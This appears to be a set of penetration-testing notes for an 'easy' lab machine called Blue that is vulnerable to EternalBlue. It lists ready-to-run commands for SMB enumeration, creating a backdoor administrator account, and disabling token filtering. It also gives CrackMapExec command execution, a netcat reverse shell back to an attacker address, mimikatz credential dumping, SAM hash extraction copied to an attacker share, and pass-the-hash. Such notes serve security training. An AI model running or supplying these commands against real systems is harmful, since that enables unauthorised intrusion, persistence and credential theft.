# Blue

Easy machine with direct exploitation of SMB service via EternalBlue (easy to exploit with
metasploit)

## Advice to scan for SMB service vulnerabilities

* Looking for vulnerable service with nmap: ```nmap --script "vuln and safe" -p445 [ip]```

* Use smbclient to list shares: ```smbclient -L [ip]```

* Use smbclient to access a share without password: ```smbclient //[ip]/[sharedVolume] -N```

* Mount volume with cifs to better navigation: ```mount -t cifs //[ip]/[sharedVolume] /mnt/smb -o username=null,password=null,domain=[domain],rw```

## Create new windows user
\
* Add new user: ```net user [username] [password] /add```

* Add user to Administrators group: ```net localgroup Administrators [username] /add```

* ```cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f``` 

## Use of CrackMapExec

* Check if we have smb access: ```cme smb [ip] -u [username] -p [password]``` (should say 'Pwn3d!)

* Execute commands: ```cme smb [ip] -u [username] -p [password] -x [command]

* Get shell via netcat (share first a SMB folder): ```cme smb [ip] -u [username] -p [password] -x '\\[attackerIp]\[SMBFolder]\nc.exe [attacketIp] [port] -e cmd.exe'```

* Get passwords using mimikatz module: ```cme smb [ip] -u [username] -p [password] -M mimikatz -o COMMAND="sekurlsa::logonPasswords"```

* Get SAM hashes (possible pass the hash): ```cme smb [ip] -u [username] -p [password] --sam```

* Perform pass the hash: ```cme smb [ip] -u [username] -H [hash]```

## Manual dump of sam hashes

* Victim: ```cd C:/Windows/Temp```

* Victim: ```reg save HKLM\SAM sam.backup```

* Victim: ```reg save HKLM\SYSTEM system.backup```

* Attacker: ```smbshare SMBFOLDER [folder]```

* Victim: ```copy sam.backup \\[ip]\SMBFOLDER\sam```

* Victim: ```copy system.backup \\[ip]\SMBFOLDER\system```

* Attacker: ```pwdump.py system sam```



